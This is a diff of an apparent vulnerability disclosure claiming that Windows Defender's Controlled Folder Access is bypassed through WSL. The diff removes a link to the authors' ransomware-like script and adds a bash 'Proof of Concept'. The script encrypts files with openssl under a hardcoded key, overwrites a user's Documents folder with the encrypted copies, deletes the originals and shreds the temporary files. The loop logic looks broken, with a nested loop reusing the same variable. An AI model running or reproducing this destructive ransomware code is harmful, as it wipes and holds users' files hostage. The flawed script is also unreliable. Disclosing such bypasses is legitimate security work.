@@ -18,8 +18,6 @@ Windows Defender Ransomware Protection does not protect users from Linux-based r
 **Long Description: -**
 When combined with our AppLocker bypass, it is possible to encrypt the device without additional permissions, regardless if apps are blocked from installing on the Windows Store using AppLocker. (Administrator must enable WSL from settings)
 
-~~Ransomware tests were performed with our own ransomware-like shell script available @ https://github.com/SocialEngineeringNeo/Exploits/blob/master/Our%20Exploits/ransomware.sh~~ **REUPLOAD PLANNED**
-
 The Controlled Folder Access protections prevent any programs from overwriting data in specific directories, this is a measure to reduce the damage performed by Windows-based ransomware attacks.
 
 By default, ~\Documents, ~\Downloads, ~\Pictures, ~\Videos, ~\Music, ~\Favourites are protected locations, preventing unwanted modifications from software.
@@ -31,7 +29,28 @@ Opening command prompt and running echo > PoC.txt will fail with error "Access D
 You may receive the following error: "-bash: echo: write error: Permission denied" Don’t worry, the error prompt is incorrect, and the file will be overwritten!
 
 It is not possible to overwrite files with openssl for whatever reason, I'm sure many other software should work.
+
 Proof of Concept: -
+
+  outdir="/mnt/c/Windows/Temp/cafecleaner_wsl_openssl"
+  target="/mnt/c/Users/bgo/Documents"
+  for file in *; do
+      # Skip if not a regular file
+      [ -f "$file" ] || continue
+      openssl aes-256-cbc -pbkdf2 -e \
+          -in "$file" \
+          -out "$outdir/$file.enc" \
+          -k "YmFzZQo;"
+      for file in "$target"/*; do
+          [ -f "$file" ] || continue
+          cp -r "$outdir"/* "$target"/
+          rm "$file"
+      done
+  done
+  for file in "$outdir"/*; do
+      [ -f "$file" ] || continue
+      shred -u "$file"
+  done
 
 **Step 1.)**    Enable 'Windows Subsystem for Linux' through 'Turn Windows features On or Off'
 
